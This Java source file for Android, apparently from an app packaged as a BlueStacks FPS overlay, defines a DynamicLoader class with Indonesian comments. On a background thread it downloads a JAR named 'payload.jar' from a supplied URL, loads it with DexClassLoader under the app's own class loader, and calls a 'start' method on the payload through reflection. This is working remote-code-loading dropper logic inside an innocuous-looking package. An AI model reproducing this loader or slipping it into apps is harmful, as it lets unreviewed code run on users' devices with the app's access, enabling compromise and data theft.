package com.bluestacks.fpsoverlay;

import android.content.Context;
import android.util.Log;
import dalvik.system.DexClassLoader;
import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class DynamicLoader {
    private static final String TAG = "DynamicLoader";

    public static void fetchAndExecute(Context context, String jarUrl, final String classNameInput) {
        new Thread(() -> {
            String className = classNameInput;
            try {
                // 1. Siapkan lokasi penyimpanan di folder internal (aman)
                File internalDir = new File(context.getFilesDir(), "modules");
                if (!internalDir.exists()) internalDir.mkdirs();
                File jarFile = new File(internalDir, "payload.jar");

                // 2. Download file JAR dari server
                Log.d(TAG, "Downloading payload from: " + jarUrl);
                URL url = new URL(jarUrl);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                try (InputStream is = new BufferedInputStream(conn.getInputStream());
                     FileOutputStream fos = new FileOutputStream(jarFile)) {
                    byte[] buffer = new byte[8192];
                    int read;
                    while ((read = is.read(buffer)) != -1) {
                        fos.write(buffer, 0, read);
                    }
                }

                // 3. Muat file DEX menggunakan DexClassLoader
                Log.d(TAG, "Loading DEX from: " + jarFile.getAbsolutePath() + " (Size: " + jarFile.length() + " bytes)");
                
                // Fix typos in class name if not already fixed in caller
                if (className.endsWith(".PayloadEntery") || className.endsWith(".PayloadEmtry")) {
                    className = className.substring(0, className.lastIndexOf(".")) + ".PayloadEntry";
                }

                // Gunakan class loader APK sebagai parent agar payload bisa mengakses class di APK utama
                DexClassLoader loader = new DexClassLoader(
                    jarFile.getAbsolutePath(),
                    internalDir.getAbsolutePath(), // optimizedDirectory
                    null,
                    context.getClassLoader()
                );

                // 4. Jalankan class dan method tertentu menggunakan Reflection
                Log.d(TAG, "Searching for class: " + className);
                Class<?> clazz = loader.loadClass(className);
                Log.d(TAG, "Class found! Instantiating...");
                Object instance = clazz.newInstance();
                
                // Asumsikan payload memiliki method "start" yang menerima Context
                Log.d(TAG, "Invoking 'start' method...");
                clazz.getMethod("start", Context.class).invoke(instance, context);
                
                Log.i(TAG, "Dynamic Payload started successfully!");

            } catch (ClassNotFoundException e) {
                Log.e(TAG, "Critical Error: Class " + className + " not found in JAR!");
            } catch (Exception e) {
                Log.e(TAG, "Failed to load dynamic payload: " + e.toString());
                e.printStackTrace();
            }
        }).start();
    }
}
